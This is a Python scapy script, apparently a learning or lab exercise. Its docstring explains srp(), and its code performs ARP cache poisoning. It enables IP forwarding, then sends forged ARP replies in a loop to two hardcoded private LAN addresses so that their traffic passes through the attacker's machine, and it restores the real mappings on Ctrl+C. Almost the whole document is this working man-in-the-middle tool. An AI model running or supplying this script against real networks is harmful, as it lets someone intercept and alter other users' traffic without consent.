'''
srp return a tuple of two list. The first element is a list of tuples (packet sent, answer),
and the second element is the list of unanswered packets. These two elements are lists, 
but they are wrapped by an object to present them better, and to provide them with some methods
that do most frequently needed actions.

for e.g
answered, unanswered = srp()

1. answered is a list of two tuples (sent packets and received packets)
2. Unanswered is a list of unanswered packets

so ,
answered = [{sent1, received1}, {sent2, received2}, {sent3, received3}]
unanswered = [unanswered, unanswered, unanswered, ...]

output of srp() == ([answered], [unanswered])
'''
import os
print(os.name)
from scapy.all import *
from scapy.layers.l2 import ARP, Ether

def enable_ip_route():
    file_path = '/proc/sys/net/ipv4/ip_forward'
    with open(file_path, 'w+') as file:
        if file.read == 1:
            pass
        else:
            file.write('1')

def get_mac(ip):
    answered, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), verbose=0)
    if answered:
        return answered[0][1].src
    
def spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=1)
    self_mac = ARP().hwsrc
    print(f"[+] Sent to: is-at {target_ip} {host_ip}, {self_mac}")

def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(arp_response, verbose=0, count=5)
    print(f"[+] Sent to: is-at {target_ip} {host_ip}, {host_mac}")

target_ip = "192.168.164.133"
host_ip = "192.168.164.24"

enable_ip_route()

try:
    while True:
        spoof(target_ip, host_ip)
        spoof(host_ip, target_ip)
        time.sleep(1)
except KeyboardInterrupt:
    print("[!] Detected CTRL + C, restoring the network...")
    restore(target_ip, host_ip)
    restore(host_ip, target_ip)

print(os.name)